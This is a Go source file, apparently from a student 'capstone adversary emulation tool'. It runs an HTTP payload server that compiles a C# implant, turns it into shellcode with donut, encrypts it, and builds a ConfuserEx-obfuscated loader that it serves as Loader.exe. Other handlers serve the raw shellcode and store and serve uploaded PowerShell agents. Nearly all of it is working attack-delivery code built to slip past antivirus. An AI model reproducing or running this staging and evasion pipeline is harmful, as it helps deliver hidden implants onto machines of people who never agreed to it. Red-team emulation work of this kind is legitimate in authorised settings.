package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
)

func generateImplant(w http.ResponseWriter, r *http.Request) {
	var cmd *exec.Cmd
	fmt.Println("Hit, generating shellcode...")
	// fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\donut.exe -a 2 --input:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe --output:F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\donut.exe -a 2 --input:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe --output:F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin")
	} else {
		cmd = exec.Command("/bin/sh", "-c", "mcs -out:/tmp/Implant.exe /mnt/f/capstone-adversary-emulation-tool/Implementation/Implant/Implant.cs && /mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/tmp/Implant.exe --output:/tmp/implant.bin")
	}

	err := cmd.Run()

	if err != nil {
		log.Fatal("Error: ", err)
	}

	fmt.Println("Encrypting the Shellcode with: AES-256 -> XOR -> Base64")
	// fmt.Println("python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cryptocutter.py -f F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin -o F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cryptocutter.py -f F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin -o F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin")
	} else {
		cmd = exec.Command("")
	}

	output, err2 := cmd.Output() // Capture the output of the command
	if err2 != nil {
		log.Fatal("Error: ", err2)
	} else {
		fmt.Println(string(output)) // Print the output
	}

	fmt.Println("Shellcode generated, compiling loader...")
	// fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
	}

	err3 := cmd.Run()
	if err3 != nil {
		log.Fatal("Error: ", err3)
	}

	fmt.Println("Encrypting the Loader now...")
	// fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
	}

	_, err4 := cmd.Output() // Capture the output of the command
	if err4 != nil {
		log.Fatal("Error: ", err4)
	}

	fmt.Println("Loader ready, serving for download...")
	// fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
	file, err := os.Open("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer file.Close()

	// Set the appropriate headers for download
	w.Header().Set("Content-Disposition", "attachment; filename=Loader.exe")
	w.Header().Set("Content-Type", "application/octet-stream")

	// Copy the file contents to the response writer
	io.Copy(w, file)
}

type Agent struct {
	Code string `json:"Code"`
}

func windowsImplant(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Agent getting downloaded")
	filepath := "F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin"
	if _, err := os.Stat(filepath); os.IsNotExist(err) {
		fmt.Println("File does not exist:", err)
		http.Error(w, "File not found.", http.StatusNotFound)
		return
	}
	http.ServeFile(w, r, filepath)

	fmt.Println("Cleaning loader...")
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cleaner.py")
	}

	err := cmd.Run()
	if err != nil {
		log.Fatal("Error: ", err)
	}
}

func powerShellImplant(w http.ResponseWriter, r *http.Request) {
	filePath := "implants/windows/powershell/agent.ps1"

	if r.Method == http.MethodPost {
		var agent Agent
		err := json.NewDecoder(r.Body).Decode(&agent)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		decoded, err := base64.StdEncoding.DecodeString(agent.Code)
		if err != nil {
			http.Error(w, "Failed to decode base64 string", http.StatusBadRequest)
			return
		}
		agent.Code = string(decoded)
		err = ioutil.WriteFile(filePath, []byte(agent.Code), 0644)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	} else if r.Method == http.MethodGet {
		fmt.Println("Hit to download powershell script")
		http.ServeFile(w, r, filePath)
	} else {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
	}
}
